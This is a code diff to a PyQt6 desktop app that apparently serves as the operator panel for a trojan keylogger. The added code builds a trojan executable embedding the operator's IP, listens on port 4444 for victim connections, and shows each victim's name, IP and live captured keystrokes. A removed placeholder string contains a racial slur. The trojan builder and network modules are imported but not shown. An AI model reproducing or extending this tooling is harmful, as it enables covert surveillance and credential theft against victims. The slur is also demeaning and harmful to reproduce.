@@ -1,7 +1,10 @@
-from PyQt6 import QtWidgets, QtCore, QtGui
 import sys
 import warnings
+import threading
+from PyQt6 import QtWidgets, QtCore, QtGui
 from Storage.database import pull_json, push_json, delete_json
+from Utils.connect import Connect, get_myIp
+from Utils.trojan_creator import create_exe
 from User_interface.Ui_design import Ui_MainWindow, InputDialog
 
 
@@ -77,21 +80,30 @@ class Logic(QtWidgets.QMainWindow):
         if not hasattr(self, "current_button"):
             if self.ui.onOffButtonD2.text().lower() == "off":
                 self.ui.onOffButtonD2.setText("ON")
+                self.ui.label_Rec2.setText("ON")
+                self.ui.label_Rec2.setStyleSheet("color: green;")
             else:
                 self.ui.onOffButtonD2.setText("OFF")
+                self.ui.label_Rec2.setText("OFF")
+                self.ui.label_Rec2.setStyleSheet("color: red;")
             return  # no button selected yet
 
         if self.ui.onOffButtonD2.text().lower() == "off":
             self.ui.onOffButtonD2.setText("ON")
-            print('on')
+            self.ui.label_Rec2.setText("ON")
+            self.ui.label_Rec2.setStyleSheet("color: green;")
         else:
             self.ui.onOffButtonD2.setText("OFF")
+            self.ui.label_Rec2.setText("OFF")
+            self.ui.label_Rec2.setStyleSheet("color: red;")
 
     def handle_bake(self):
         # Get reference to the last button you interacted with
         if not hasattr(self, "current_button"):
             return  # no button selected yet
-        print('Trojan Created')
+        ip = get_myIp()
+        create_exe(ip, self.current_button.text())
+        self.ui.statusbar.showMessage("✅Trojan Successfully Created!", 5000)
 
     def toggle_displaying(self):
         # Get reference to the last button you interacted with
@@ -104,7 +116,6 @@ class Logic(QtWidgets.QMainWindow):
             return  # no button selected yet
         if self.ui.button_show.isChecked():
             self.ui.button_show.setText('ON')
-            self.display()
 
         else:
             self.ui.button_show.setText('OFF')
@@ -121,23 +132,47 @@ class Logic(QtWidgets.QMainWindow):
         updated_list[0] = port
         self.storage[self.current_button.text()] = updated_list
         push_json(self.storage)
-        print('save')
+        self.ui.statusbar.showMessage("✅Successfully Saved!", 5000)
 
     def activate(self):
-        # Get reference to the last button you interacted with
+        # no button selected yet
         if not hasattr(self, "current_button"):
             if self.ui.activateButton.isChecked():
-                self.ui.activateButton.setText('ACTIVATED')
-
+                self.ui.activateButton.setText("ACTIVATED")
+                self.ui.label_Act.setText("ACTIVATED")
+                self.ui.label_Act.setStyleSheet("color: green;")
             else:
-                self.ui.activateButton.setText('DEACTIVATED')
-            return  # no button selected yet
+                self.ui.activateButton.setText("DEACTIVATED")
+                self.ui.label_Act.setText("DEACTIVATED")
+                self.ui.label_Act.setStyleSheet("color: red;")
+            return
+
         if self.ui.activateButton.isChecked():
-            self.ui.activateButton.setText('ACTIVATED')
+            self.ui.activateButton.setText("ACTIVATED")
+            self.ui.label_Act.setText("ACTIVATED")
+            self.ui.label_Act.setStyleSheet("color: green;")
+
+            # run network activate in background
+            self.network = Connect(4444)
+
+            # Connect signals to slots
+            self.network.info_received.connect(self.update_info)
+            self.network.keystroke_received.connect(self.update_keystrokes)
+            self.network.message_received.connect(self.update_message)
+
+            # Start listening
+            self.network.activate()
+
 
         else:
-            self.ui.activateButton.setText('DEACTIVATED')
-        print('activate')
+            self.ui.activateButton.setText("DEACTIVATED")
+            self.ui.label_Act.setText("DEACTIVATED")
+            self.ui.label_Act.setStyleSheet("color: red;")
+            self.network.exit()
+            self.ui.label_view_target_info.setText("OFFLINE")
+            self.ui.label_view_target_info.setStyleSheet("color: red;")
+            self.ui.label_target_status.setText("OFFLINE")
+            self.ui.label_target_status.setStyleSheet("color: red;")
 
     def handle_delete(self):
         """Delete the currently selected/active button and update JSON."""
@@ -161,7 +196,6 @@ class Logic(QtWidgets.QMainWindow):
 
         # Reset current button
         self.current_button = None
-        print('delete')
 
     def handle_newButton(self):
         _translate = QtCore.QCoreApplication.translate
@@ -169,6 +203,7 @@ class Logic(QtWidgets.QMainWindow):
             self.ui.entryC2.setText(_translate("MainWindow", f"{self.storage.get(self.current_button.text())[0]}"))
             self.ui.labelB2.setText(_translate("MainWindow", f"{self.storage.get(self.current_button.text())[1]}"))
             self.ui.labelA2.setText(_translate("MainWindow", f"{self.storage.get(self.current_button.text())[2]}"))
+            self.ui.label_top.setText(_translate("MainWindow", f"{self.storage.get(self.current_button.text())[2]}"))
 
     def load_buttons(self):
         """Load buttons from JSON"""
@@ -177,39 +212,40 @@ class Logic(QtWidgets.QMainWindow):
         for label in self.storage.keys():
             self.handle_create(label)
 
-    def display(self):
-        self.max_lines = 15  # keep only last 50 messages
-        self.lines = []
-
-        self.counter = 0
-        self.timer = QtCore.QTimer(self)
-        self.timer.timeout.connect(self.update_label)
-        self.timer.start(500)
-
-    def update_label(self):
-        self.counter += 1
-        self.lines.append(
-            f'Hello nigga vbvoewof weiweivwve wivw vief oqe qoeivbiqev qeqiebr uqererg ejrgergq '
-            f'iergire riqbeiur'
-            f'pgirgwrh wjruf equgvy erifgejh uguerg wiiurbghh rgubrh rgwiurg wruru\n {self.counter}')
-        if len(self.lines) > self.max_lines:
-            self.lines.pop(0)
-
-        # Save scrollbar state *before* updating
-        scrollbar = self.ui.Viewlabel.verticalScrollBar()
-        at_bottom = scrollbar.value() == scrollbar.maximum()
-
-        # Update text
-        self.ui.Viewlabel.setPlainText("\n".join(self.lines))
-
-        # Restore scroll only if user was at bottom
-        if at_bottom:
-            scrollbar.setValue(scrollbar.maximum())
-
     def set_current_button(self, button):
         """Mark the button as the currently active one for delete operations."""
         self.current_button = button
         self.handle_newButton()  # still call your existing function
+
+    def update_info(self, name, ip):
+        # update your GUI labels here
+        self.ui.labelA2.setText(name)
+        self.ui.label_top.setText(name)
+        self.ui.labelB2.setText(ip)
+        updated_list = self.storage.get(self.current_button.text())
+        if updated_list[2] != name and updated_list[1] != ip:
+            updated_list[2] = name
+            updated_list[1] = ip
+            self.storage[self.current_button.text()] = updated_list
+            push_json(self.storage)
+        elif updated_list[2] == name:
+            updated_list[1] = ip
+            self.storage[self.current_button.text()] = updated_list
+            push_json(self.storage)
+
+    def update_keystrokes(self, keys):
+        # append keystrokes live
+        if self.ui.button_show.isChecked():
+            # Update text
+            self.ui.Viewlabel.setPlainText(keys)
+
+    def update_message(self, msg):
+        if msg == "Connected":
+            self.ui.label_view_target_info.setText("ONLINE")
+            self.ui.label_view_target_info.setStyleSheet("color: green;")
+            self.ui.label_target_status.setText("ONLINE")
+            self.ui.label_target_status.setStyleSheet("color: green;")
+        self.ui.statusbar.showMessage(msg, 5000)
 
 
 if __name__ == "__main__":
